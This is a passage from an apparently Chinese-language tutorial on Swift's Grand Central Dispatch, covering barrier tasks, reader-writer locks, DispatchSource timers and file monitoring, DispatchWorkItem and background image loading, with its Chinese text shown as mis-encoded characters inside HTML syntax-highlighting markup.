    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡1ç»“æŸ"</span>)
}
concurrentQueue.async { 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡2ç»“æŸ"</span>)
}
concurrentQueue.async { 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡3å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡3ç»“æŸ"</span>)
}

<span class="hljs-comment">// æ …æ ä»»åŠ¡ï¼šç­‰å¾…å‰é¢çš„ä»»åŠ¡å®Œæˆï¼Œç„¶åæ‰§è¡Œ</span>
concurrentQueue.async(flags: .barrier) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ …æ ä»»åŠ¡ï¼šå‰é¢çš„ä»»åŠ¡éƒ½å®Œæˆäº†"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ …æ ä»»åŠ¡æ‰§è¡Œä¸­..."</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ …æ ä»»åŠ¡å®Œæˆ"</span>)
}

<span class="hljs-comment">// æ …æ åçš„ä»»åŠ¡ï¼šç­‰å¾…æ …æ ä»»åŠ¡å®Œæˆåï¼Œå¹¶å‘æ‰§è¡Œ</span>
concurrentQueue.async { 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡4å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡4ç»“æŸ"</span>)
}
concurrentQueue.async { 
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡5å¼€å§‹"</span>)
    sleep(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡5ç»“æŸ"</span>)
}
</code></pre>
<p><strong>æ‰§è¡Œé¡ºåºï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ä»»åŠ¡1ã€2ã€3 å¹¶å‘æ‰§è¡Œï¼ˆå¯èƒ½åŒæ—¶æ‰§è¡Œï¼‰
<span class="hljs-bullet">2.</span> ç­‰å¾…ä»»åŠ¡1ã€2ã€3 å…¨éƒ¨å®Œæˆ
<span class="hljs-bullet">3.</span> æ‰§è¡Œæ …æ ä»»åŠ¡ï¼ˆç‹¬å æ‰§è¡Œï¼‰
<span class="hljs-bullet">4.</span> æ …æ ä»»åŠ¡å®Œæˆåï¼Œä»»åŠ¡4ã€5 å¹¶å‘æ‰§è¡Œ
</code></pre>
<h5 data-id="heading-83">æ‰§è¡Œæµç¨‹å›¾</h5>
<pre><code class="hljs">å¹¶è¡Œé˜Ÿåˆ—ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æ …æ å‰çš„ä»»åŠ¡ï¼ˆå¹¶å‘æ‰§è¡Œï¼‰                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”              â”‚
â”‚  â”‚ä»»åŠ¡1â”‚  â”‚ä»»åŠ¡2â”‚  â”‚ä»»åŠ¡3â”‚              â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜              â”‚
â”‚      â†“         â†“         â†“               â”‚
â”‚      â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜              â”‚
â”‚              â†“                           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                â”‚
â”‚  â”‚   æ …æ ä»»åŠ¡ï¼ˆç‹¬å ï¼‰    â”‚                â”‚
â”‚  â”‚  ï¼ˆç­‰å¾…å‰é¢å®Œæˆï¼‰     â”‚                â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                â”‚
â”‚              â†“                           â”‚
â”‚  æ …æ åçš„ä»»åŠ¡ï¼ˆå¹¶å‘æ‰§è¡Œï¼‰                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”                        â”‚
â”‚  â”‚ä»»åŠ¡4â”‚  â”‚ä»»åŠ¡5â”‚                        â”‚
â”‚  â””â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”˜                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h5 data-id="heading-84">å…³é”®ç‰¹æ€§</h5>
<ol>
<li>
<p><strong>ç­‰å¾…å‰é¢çš„ä»»åŠ¡å®Œæˆ</strong></p>
<ul>
<li>æ …æ ä»»åŠ¡ä¼šç­‰å¾…æ‰€æœ‰åœ¨å®ƒä¹‹å‰æäº¤çš„ä»»åŠ¡å®Œæˆ</li>
<li>æ— è®ºè¿™äº›ä»»åŠ¡æ˜¯å¦å·²ç»å¼€å§‹æ‰§è¡Œ</li>
</ul>
</li>
<li>
<p><strong>ç‹¬å æ‰§è¡Œ</strong></p>
<ul>
<li>æ …æ ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œé˜Ÿåˆ—ä¸­çš„å…¶ä»–ä»»åŠ¡å¿…é¡»ç­‰å¾…</li>
<li>ä¿è¯æ …æ ä»»åŠ¡æ‰§è¡Œæ—¶ä¸ä¼šæœ‰å…¶ä»–ä»»åŠ¡åŒæ—¶æ‰§è¡Œ</li>
</ul>
</li>
<li>
<p><strong>é˜»å¡åé¢çš„ä»»åŠ¡</strong></p>
<ul>
<li>æ …æ ä»»åŠ¡æ‰§è¡Œå®Œæˆåï¼Œåé¢çš„ä»»åŠ¡æ‰èƒ½å¼€å§‹æ‰§è¡Œ</li>
</ul>
</li>
<li>
<p><strong>åªåœ¨å¹¶è¡Œé˜Ÿåˆ—æœ‰æ•ˆ</strong></p>
<ul>
<li>æ …æ ä»»åŠ¡åªåœ¨å¹¶è¡Œé˜Ÿåˆ—ï¼ˆ<code>.concurrent</code>ï¼‰ä¸­æœ‰æ•ˆ</li>
<li>åœ¨ä¸²è¡Œé˜Ÿåˆ—ä¸­ä½¿ç”¨æ …æ ä»»åŠ¡æ²¡æœ‰æ„ä¹‰ï¼ˆä¸²è¡Œé˜Ÿåˆ—æœ¬èº«å°±æ˜¯é¡ºåºæ‰§è¡Œï¼‰</li>
</ul>
</li>
</ol>
<h5 data-id="heading-85">å®é™…åº”ç”¨åœºæ™¯</h5>
<h6 data-id="heading-86">åº”ç”¨1ï¼šè¯»å†™é”ï¼ˆæœ€å¸¸ç”¨ï¼‰</h6>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataCache</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(
        label: <span class="hljs-string">"cache"</span>,
        attributes: .concurrent
    )
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cache: [<span class="hljs-type">String</span>: <span class="hljs-keyword">Any</span>] <span class="hljs-operator">=</span> [:]
    
    <span class="hljs-comment">// è¯»æ“ä½œï¼šå¹¶å‘æ‰§è¡Œï¼ˆå¤šä¸ªè¯»æ“ä½œå¯ä»¥åŒæ—¶è¿›è¡Œï¼‰</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>: <span class="hljs-type">String</span>) -&gt; <span class="hljs-keyword">Any</span><span class="hljs-operator">?</span> {
        <span class="hljs-keyword">return</span> concurrentQueue.sync {
            <span class="hljs-keyword">return</span> cache[key]
        }
    }
    
    <span class="hljs-comment">// å†™æ“ä½œï¼šä½¿ç”¨æ …æ ï¼Œä¿è¯ç‹¬å è®¿é—®ï¼ˆå†™æ“ä½œæ—¶ï¼Œè¯»æ“ä½œå¿…é¡»ç­‰å¾…ï¼‰</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">set</span>(<span class="hljs-params">key</span>: <span class="hljs-type">String</span>, <span class="hljs-params">value</span>: <span class="hljs-keyword">Any</span>) {
        concurrentQueue.async(flags: .barrier) {
            <span class="hljs-keyword">self</span>.cache[key] <span class="hljs-operator">=</span> value
        }
    }
    
    <span class="hljs-comment">// æ‰¹é‡å†™æ“ä½œï¼šä½¿ç”¨æ …æ ä¿è¯åŸå­æ€§</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateCache</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">updates</span>: [<span class="hljs-params">String</span>: <span class="hljs-keyword">Any</span>]) {
        concurrentQueue.async(flags: .barrier) {
            <span class="hljs-keyword">for</span> (key, value) <span class="hljs-keyword">in</span> updates {
                <span class="hljs-keyword">self</span>.cache[key] <span class="hljs-operator">=</span> value
            }
        }
    }
}
</code></pre>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<ul>
<li>å¤šä¸ªè¯»æ“ä½œå¯ä»¥å¹¶å‘æ‰§è¡Œï¼ˆæ€§èƒ½é«˜ï¼‰</li>
<li>å†™æ“ä½œä½¿ç”¨æ …æ ï¼Œç¡®ä¿å†™æ“ä½œæ—¶æ²¡æœ‰è¯»æ“ä½œï¼ˆæ•°æ®å®‰å…¨ï¼‰</li>
<li>å†™æ“ä½œå®Œæˆåï¼Œè¯»æ“ä½œæ‰èƒ½ç»§ç»­</li>
</ul>
<h6 data-id="heading-87">åº”ç”¨2ï¼šæ•°æ®åŒæ­¥ç‚¹</h6>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DataProcessor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"processor"</span>, attributes: .concurrent)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> data: [<span class="hljs-type">Int</span>] <span class="hljs-operator">=</span> []
    
    <span class="hljs-comment">// é˜¶æ®µ1ï¼šå¹¶å‘å¤„ç†æ•°æ®</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">processData</span>() {
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">1</span><span class="hljs-operator">...</span><span class="hljs-number">10</span> {
            queue.async {
                <span class="hljs-comment">// å¹¶å‘å¤„ç†</span>
                <span class="hljs-keyword">let</span> result <span class="hljs-operator">=</span> <span class="hljs-keyword">self</span>.processItem(i)
                <span class="hljs-comment">// æ³¨æ„ï¼šè¿™é‡Œéœ€è¦çº¿ç¨‹å®‰å…¨åœ°æ·»åŠ æ•°æ®</span>
            }
        }
        
        <span class="hljs-comment">// æ …æ ä»»åŠ¡ï¼šç­‰å¾…æ‰€æœ‰å¤„ç†å®Œæˆï¼Œç„¶ååŒæ­¥æ•°æ®</span>
        queue.async(flags: .barrier) {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰æ•°æ®å¤„ç†å®Œæˆï¼Œå¼€å§‹åŒæ­¥"</span>)
            <span class="hljs-keyword">self</span>.syncData()
        }
        
        <span class="hljs-comment">// é˜¶æ®µ2ï¼šåŒæ­¥å®Œæˆåï¼Œç»§ç»­å¤„ç†</span>
        queue.async {
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"å¼€å§‹åç»­å¤„ç†"</span>)
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">processItem</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">item</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">return</span> item <span class="hljs-operator">*</span> <span class="hljs-number">2</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">syncData</span>() {
        <span class="hljs-comment">// åŒæ­¥æ•°æ®åˆ°æ•°æ®åº“æˆ–æœåŠ¡å™¨</span>
    }
}
</code></pre>
<h6 data-id="heading-88">åº”ç”¨3ï¼šæ‰¹é‡æ“ä½œçš„åˆ†ç•Œç‚¹</h6>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageDownloader</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"download"</span>, attributes: .concurrent)
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">downloadImages</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">urls</span>: [<span class="hljs-type">String</span>]) {
        <span class="hljs-comment">// é˜¶æ®µ1ï¼šå¹¶å‘ä¸‹è½½</span>
        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls {
            queue.async {
                <span class="hljs-keyword">self</span>.downloadImage(url: url)
            }
        }
        
        <span class="hljs-comment">// æ …æ ä»»åŠ¡ï¼šæ‰€æœ‰ä¸‹è½½å®Œæˆåï¼Œæ›´æ–°UI</span>
        queue.async(flags: .barrier) {
            <span class="hljs-type">DispatchQueue</span>.main.async {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰å›¾ç‰‡ä¸‹è½½å®Œæˆ"</span>)
                <span class="hljs-keyword">self</span>.updateUI()
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">downloadImage</span>(<span class="hljs-params">url</span>: <span class="hljs-type">String</span>) {
        <span class="hljs-comment">// ä¸‹è½½é€»è¾‘</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">updateUI</span>() {
        <span class="hljs-comment">// æ›´æ–°UI</span>
    }
}
</code></pre>
<h6 data-id="heading-89">åº”ç”¨4ï¼šç¡®ä¿åˆå§‹åŒ–å®Œæˆ</h6>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceManager</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"resource"</span>, attributes: .concurrent)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">initialize</span>() {
        <span class="hljs-comment">// åˆå§‹åŒ–ä»»åŠ¡ï¼šå¹¶å‘æ‰§è¡Œ</span>
        queue.async {
            <span class="hljs-keyword">self</span>.loadConfig()
        }
        queue.async {
            <span class="hljs-keyword">self</span>.loadCache()
        }
        queue.async {
            <span class="hljs-keyword">self</span>.loadData()
        }
        
        <span class="hljs-comment">// æ …æ ä»»åŠ¡ï¼šç­‰å¾…æ‰€æœ‰åˆå§‹åŒ–å®Œæˆ</span>
        queue.async(flags: .barrier) {
            <span class="hljs-keyword">self</span>.isInitialized <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"åˆå§‹åŒ–å®Œæˆ"</span>)
        }
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">useResource</span>() {
        queue.async(flags: .barrier) {
            <span class="hljs-keyword">guard</span> <span class="hljs-keyword">self</span>.isInitialized <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"èµ„æºæœªåˆå§‹åŒ–"</span>)
                <span class="hljs-keyword">return</span>
            }
            <span class="hljs-comment">// ä½¿ç”¨èµ„æº</span>
        }
    }
}
</code></pre>
<h5 data-id="heading-90">æ³¨æ„äº‹é¡¹</h5>
<ol>
<li>
<p><strong>åªåœ¨å¹¶è¡Œé˜Ÿåˆ—æœ‰æ•ˆ</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">let</span> concurrentQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"queue"</span>, attributes: .concurrent)
concurrentQueue.async(flags: .barrier) { }

<span class="hljs-comment">// âŒ æ— æ•ˆï¼šåœ¨ä¸²è¡Œé˜Ÿåˆ—ä¸­ä½¿ç”¨æ …æ æ²¡æœ‰æ„ä¹‰</span>
<span class="hljs-keyword">let</span> serialQueue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"queue"</span>)
serialQueue.async(flags: .barrier) { }  <span class="hljs-comment">// ä¸²è¡Œé˜Ÿåˆ—æœ¬èº«å°±æ˜¯é¡ºåºæ‰§è¡Œ</span>
</code></pre>
</li>
<li>
<p><strong>æ …æ ä»»åŠ¡ä¼šé˜»å¡é˜Ÿåˆ—</strong></p>
<ul>
<li>æ …æ ä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œé˜Ÿåˆ—ä¸­çš„å…¶ä»–ä»»åŠ¡å¿…é¡»ç­‰å¾…</li>
<li>é¿å…åœ¨æ …æ ä»»åŠ¡ä¸­æ‰§è¡Œè€—æ—¶æ“ä½œ</li>
</ul>
</li>
<li>
<p><strong>ä¸ sync çš„åŒºåˆ«</strong></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// syncï¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç­‰å¾…ä»»åŠ¡å®Œæˆ</span>
queue.sync { }  <span class="hljs-comment">// å½“å‰çº¿ç¨‹ç­‰å¾…</span>

<span class="hljs-comment">// barrierï¼šåœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­åˆ›å»ºåˆ†ç•Œç‚¹</span>
queue.async(flags: .barrier) { }  <span class="hljs-comment">// ä¸é˜»å¡å½“å‰çº¿ç¨‹ï¼Œä½†é˜»å¡é˜Ÿåˆ—ä¸­çš„å…¶ä»–ä»»åŠ¡</span>
</code></pre>
</li>
</ol>
<h5 data-id="heading-91">å®Œæ•´ç¤ºä¾‹ï¼šçº¿ç¨‹å®‰å…¨çš„æ•°æ®ç»“æ„</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadSafeArray</span>&lt;<span class="hljs-title class_">T</span>&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>(label: <span class="hljs-string">"array"</span>, attributes: .concurrent)
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> array: [<span class="hljs-type">T</span>] <span class="hljs-operator">=</span> []
    
    <span class="hljs-comment">// è¯»æ“ä½œï¼šå¹¶å‘æ‰§è¡Œ</span>
    <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span> {
        <span class="hljs-keyword">return</span> queue.sync { array.count }
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">at</span> <span class="hljs-params">index</span>: <span class="hljs-type">Int</span>) -&gt; <span class="hljs-type">T</span>? {
        <span class="hljs-keyword">return</span> queue.sync {
            <span class="hljs-keyword">guard</span> index <span class="hljs-operator">&lt;</span> array.count <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> }
            <span class="hljs-keyword">return</span> array[index]
        }
    }
    
    <span class="hljs-comment">// å†™æ“ä½œï¼šä½¿ç”¨æ …æ ï¼Œä¿è¯ç‹¬å è®¿é—®</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">append</span>(<span class="hljs-keyword">_</span> <span class="hljs-params">element</span>: <span class="hljs-type">T</span>) {
        queue.async(flags: .barrier) {
            <span class="hljs-keyword">self</span>.array.append(element)
        }
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">at</span> <span class="hljs-params">index</span>: <span class="hljs-type">Int</span>) {
        queue.async(flags: .barrier) {
            <span class="hljs-keyword">guard</span> index <span class="hljs-operator">&lt;</span> <span class="hljs-keyword">self</span>.array.count <span class="hljs-keyword">else</span> { <span class="hljs-keyword">return</span> }
            <span class="hljs-keyword">self</span>.array.remove(at: index)
        }
    }
    
    <span class="hljs-comment">// æ‰¹é‡æ“ä½œï¼šä½¿ç”¨æ …æ ä¿è¯åŸå­æ€§</span>
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">replaceAll</span>(<span class="hljs-params">with</span> <span class="hljs-params">newArray</span>: [<span class="hljs-type">T</span>]) {
        queue.async(flags: .barrier) {
            <span class="hljs-keyword">self</span>.array <span class="hljs-operator">=</span> newArray
        }
    }
}
</code></pre>
<h5 data-id="heading-92">æ€»ç»“</h5>
<p><strong>DispatchBarrier çš„æ ¸å¿ƒä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… åœ¨å¹¶è¡Œé˜Ÿåˆ—ä¸­åˆ›å»º"åˆ†ç•Œç‚¹"</li>
<li>âœ… ç¡®ä¿æ …æ å‰çš„ä»»åŠ¡å…¨éƒ¨å®Œæˆ</li>
<li>âœ… æ …æ ä»»åŠ¡ç‹¬å æ‰§è¡Œ</li>
<li>âœ… æ …æ åçš„ä»»åŠ¡ç­‰å¾…æ …æ å®Œæˆ</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>è¯»å†™é”å®ç°</li>
<li>æ•°æ®åŒæ­¥ç‚¹</li>
<li>æ‰¹é‡æ“ä½œçš„åˆ†ç•Œ</li>
<li>åˆå§‹åŒ–å®Œæˆç¡®è®¤</li>
<li>çº¿ç¨‹å®‰å…¨çš„æ•°æ®ç»“æ„</li>
</ul>
<hr/>
<h4 data-id="heading-93">4. DispatchSourceï¼ˆäº‹ä»¶æºï¼‰</h4>
<h5 data-id="heading-94">å®šä¹‰</h5>
<p>ç”¨äºç›‘å¬ç³»ç»Ÿäº‹ä»¶ï¼Œå¦‚å®šæ—¶å™¨ã€æ–‡ä»¶å˜åŒ–ã€ä¿¡å·ç­‰ã€‚</p>
<h5 data-id="heading-95">å®šæ—¶å™¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºå®šæ—¶å™¨</span>
<span class="hljs-keyword">let</span> timer <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeTimerSource(queue: .global())
timer.schedule(deadline: .now(), repeating: <span class="hljs-number">1.0</span>)
timer.setEventHandler {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å®šæ—¶å™¨è§¦å‘"</span>)
}
timer.resume()

<span class="hljs-comment">// å–æ¶ˆå®šæ—¶å™¨</span>
<span class="hljs-comment">// timer.cancel()</span>
</code></pre>
<h5 data-id="heading-96">æ–‡ä»¶ç›‘æ§ç¤ºä¾‹</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> fileURL <span class="hljs-operator">=</span> <span class="hljs-type">URL</span>(fileURLWithPath: <span class="hljs-string">"/path/to/file"</span>)
<span class="hljs-keyword">let</span> fileDescriptor <span class="hljs-operator">=</span> <span class="hljs-keyword">open</span>(fileURL.path, <span class="hljs-type">O_EVTONLY</span>)

<span class="hljs-keyword">let</span> source <span class="hljs-operator">=</span> <span class="hljs-type">DispatchSource</span>.makeFileSystemObjectSource(
    fileDescriptor: fileDescriptor,
    eventMask: .write,
    queue: .global()
)

source.setEventHandler {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ–‡ä»¶è¢«ä¿®æ”¹"</span>)
}

source.resume()
</code></pre>
<hr/>
<h4 data-id="heading-97">5. DispatchWorkItemï¼ˆä»»åŠ¡å°è£…ï¼‰</h4>
<h5 data-id="heading-98">å®šä¹‰</h5>
<p>å°†ä»»åŠ¡å°è£…æˆå¯¹è±¡ï¼Œå¯ä»¥å–æ¶ˆã€ç­‰å¾…ã€é€šçŸ¥ã€‚</p>
<h5 data-id="heading-99">åŸºæœ¬ä½¿ç”¨</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// åˆ›å»ºä»»åŠ¡</span>
<span class="hljs-keyword">let</span> workItem <span class="hljs-operator">=</span> <span class="hljs-type">DispatchWorkItem</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>)
}

<span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
<span class="hljs-type">DispatchQueue</span>.global().async(execute: workItem)

<span class="hljs-comment">// ç­‰å¾…ä»»åŠ¡å®Œæˆ</span>
workItem.wait()

<span class="hljs-comment">// å–æ¶ˆä»»åŠ¡ï¼ˆå¦‚æœè¿˜æ²¡å¼€å§‹æ‰§è¡Œï¼‰</span>
workItem.cancel()
</code></pre>
<h5 data-id="heading-100">ä»»åŠ¡é€šçŸ¥</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">let</span> workItem <span class="hljs-operator">=</span> <span class="hljs-type">DispatchWorkItem</span> {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œ"</span>)
}

workItem.notify(queue: .main) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ä»»åŠ¡å®Œæˆ"</span>)
}

<span class="hljs-type">DispatchQueue</span>.global().async(execute: workItem)
</code></pre>
<hr/>
<h3 data-id="heading-101">å…­ã€å®é™…åº”ç”¨åœºæ™¯</h3>
<h4 data-id="heading-102">åœºæ™¯1ï¼šå›¾ç‰‡ä¸‹è½½å’Œæ˜¾ç¤º</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">loadImage</span>(<span class="hljs-params">url</span>: <span class="hljs-type">String</span>, <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> (<span class="hljs-type">UIImage</span>?) -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-type">DispatchQueue</span>.global().async {
        <span class="hljs-comment">// åœ¨åå°çº¿ç¨‹ä¸‹è½½</span>
        <span class="hljs-keyword">guard</span> <span class="hljs-keyword">let</span> imageURL <span class="hljs-operator">=</span> <span class="hljs-type">URL</span>(string: url),
              <span class="hljs-keyword">let</span> data <span class="hljs-operator">=</span> <span class="hljs-keyword">try?</span> <span class="hljs-type">Data</span>(contentsOf: imageURL),
              <span class="hljs-keyword">let</span> image <span class="hljs-operator">=</span> <span class="hljs-type">UIImage</span>(data: data) <span class="hljs-keyword">else</span> {
            completion(<span class="hljs-literal">nil</span>)
            <span class="hljs-keyword">return</span>
        }
        
        <span class="hljs-comment">// å›åˆ°ä¸»çº¿ç¨‹æ›´æ–° UI</span>
        <span class="hljs-type">DispatchQueue</span>.main.async {
            completion(image)
        }
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
loadImage(url: <span class="hljs-string">"https://example.com/image.jpg"</span>) { image <span class="hljs-keyword">in</span>
    <span class="hljs-keyword">self</span>.imageView.image <span class="hljs-operator">=</span> image
}
</code></pre>
<h4 data-id="heading-103">åœºæ™¯2ï¼šæ‰¹é‡æ•°æ®å¤„ç†</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">func</span> <span class="hljs-title function_">processLargeData</span>(<span class="hljs-params">data</span>: [<span class="hljs-type">Int</span>], <span class="hljs-params">completion</span>: <span class="hljs-keyword">@escaping</span> ([<span class="hljs-type">Int</span>]) -&gt; <span class="hljs-type">Void</span>) {
    <span class="hljs-keyword">let</span> group <span class="hljs-operator">=</span> <span class="hljs-type">DispatchGroup</span>()
    <span class="hljs-keyword">let</span> queue <span class="hljs-operator">=</span> <span class="hljs-type">DispatchQueue</span>.global()
    <span class="hljs-keyword">var</span> results: [<span class="hljs-type">Int</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">let</span> lock <span class="hljs-operator">=</span> <span class="hljs-type">NSLock</span>()
    
    <span class="hljs-comment">// åˆ†æ‰¹å¤„ç†</span>
    <span class="hljs-keyword">let</span> batchSize <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">stride</span>(from: <span class="hljs-number">0</span>, to: data.count, by: batchSize) {
        <span class="hljs-keyword">let</span> end <span class="hljs-operator">=</span> <span class="hljs-built_in">min</span>(i <span class="hljs-operator">+</span> batchSize, data.count)
        <span class="hljs-keyword">let</span> batch <span class="hljs-operator">=</span> <span class="hljs-type">Array</span>(data[i<span class="hljs-operator">..&lt;</span>end])
        
        group.enter()
        queue.async {
            <span class="hljs-comment">// å¤„ç†æ‰¹æ¬¡</span>
            <span class="hljs-keyword">let</span> processed <span class="hljs-operator">=</span> batch.map { <span class="hljs-variable">$0</span> <span class="hljs-operator">*</span> <span class="hljs-number">2</span> }
            
